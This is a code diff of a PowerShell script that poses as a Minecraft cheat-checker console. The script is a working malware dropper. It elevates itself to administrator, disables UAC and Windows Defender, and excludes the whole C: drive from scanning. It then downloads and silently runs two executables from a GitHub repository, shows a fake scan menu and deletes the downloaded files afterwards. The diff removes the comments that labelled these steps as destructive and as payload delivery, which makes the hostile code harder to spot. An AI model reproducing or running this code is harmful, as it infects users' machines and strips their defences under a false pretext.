@@ -1,6 +1,3 @@
-# /// PROTOCOL KRA: MODIFIED SHELLBAG CONSOLE ///
-
-# ===== БЛОК 1: ПРИНУДИТЕЛЬНАЯ ЭСКАЛАЦИЯ ПРИВИЛЕГИЙ =====
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Host "[KRA]: Requesting Admin privileges..."
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
@@ -8,21 +5,19 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 }
 
-# ===== БЛОК 2: ДЕСТРУКТИВНЫЕ ДЕЙСТВИЯ С СИСТЕМОЙ =====
+
 Write-Host "[KRA]: Modifying system configuration..."
 
-# 2.1 Отключение UAC
+
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
 Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
 
-# 2.2 Полная деактивация Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 
-# ===== БЛОК 3: ЗАГРУЗКА ПОЛЕЗНОЙ НАГРУЗКИ =====
 Write-Host "[KRA]: Downloading payloads..."
 $url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/winlogo.exe"
 $url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Client.exe"
@@ -37,11 +32,10 @@ Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction Silen
 Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
 
-# ===== БЛОК 4: SHELLBAG CONSOLE С KRAKEH ASCII-АРТОМ =====
 Clear-Host
 $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | KRAKEH MODULE"
 
-# Функция отрисовки KRAKEH ASCII-арта
+
 function Show-KRAKEH-Header {
     # Очищаем область заголовка
     $headerArt = @"
@@ -60,14 +54,11 @@ function Show-KRAKEH-Header {
         $lineY++
     }
     
-    # Разделитель
     Write-Host "================================================" -ForegroundColor Magenta
     Write-Host "          SHELLBAG CONSOLE - KRA EDITION         " -ForegroundColor Yellow
     Write-Host "================================================" -ForegroundColor Magenta
     Write-Host ""
 }
-
-# Функция анимированного прогресс-бара
 function Show-ProgressBar {
     param($Text, $DurationMs = 3000, $BarWidth = 40)
     
@@ -84,7 +75,6 @@ function Show-ProgressBar {
     Write-Host ""
 }
 
-# Функция очистки области меню
 function Clear-MenuArea {
     $currentY = [Console]::CursorTop
     for ($i = 0; $i -lt 15; $i++) {
@@ -93,12 +83,11 @@ function Clear-MenuArea {
     [Console]::SetCursorPosition(0, 12)
 }
 
-# Основной цикл программы
 do {
     Clear-Host
     Show-KRAKEH-Header
     
-    # Главное меню
+
     Write-Host "[1] MINECRAFT SCAN" -ForegroundColor Green
     Write-Host "[2] BETA SCAN" -ForegroundColor Yellow
     Write-Host "[3] FULL CHECKER FOLDER .minecraft" -ForegroundColor Cyan
@@ -107,7 +96,7 @@ do {
     Write-Host "================================================" -ForegroundColor DarkGray
     $choice = Read-Host "SELECT OPTION (1-4)"
     
-    # Обработка выбора
+    
     switch ($choice) {
         "1" {
             Clear-MenuArea
@@ -154,11 +143,11 @@ do {
     }
 } while ($choice -ne "4")
 
-# ===== БЛОК 5: ФИНАЛИЗАЦИЯ =====
+
 Write-Host ""
 Write-Host "================================================" -ForegroundColor Magenta
 
-# Разноцветное сообщение
+
 Write-Host "чити не " -NoNewline -ForegroundColor Red
 Write-Host "найдени " -NoNewline -ForegroundColor Yellow
 Write-Host "прасмотир " -NoNewline -ForegroundColor Green
@@ -170,14 +159,13 @@ Write-Host "с " -NoNewline -ForegroundColor DarkYellow
 Write-Host "намі" -ForegroundColor Red
 Write-Host "<3" -ForegroundColor Magenta
 
-# Запуск CMD с curl parrot.live
 Write-Host ""
-Write-Host "[KRA]: Launching CMD animation..."
+Write-Host "[KRA]: Launching"
 Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause"
 
-# Очистка следов
+
 Remove-Item $path1 -Force -ErrorAction SilentlyContinue
 Remove-Item $path2 -Force -ErrorAction SilentlyContinue
 
-Write-Host "[KRA]: SCRIPT EXECUTION COMPLETE." -ForegroundColor DarkGreen
-"[KRA]: SHELLBAG CONSOLE WITH KRAKEH HEADER - EXECUTED SUCCESSFULLY."
+Write-Host "WELCOME" -ForegroundColor DarkGreen
+"WELCOME TO CLAH FLUX"
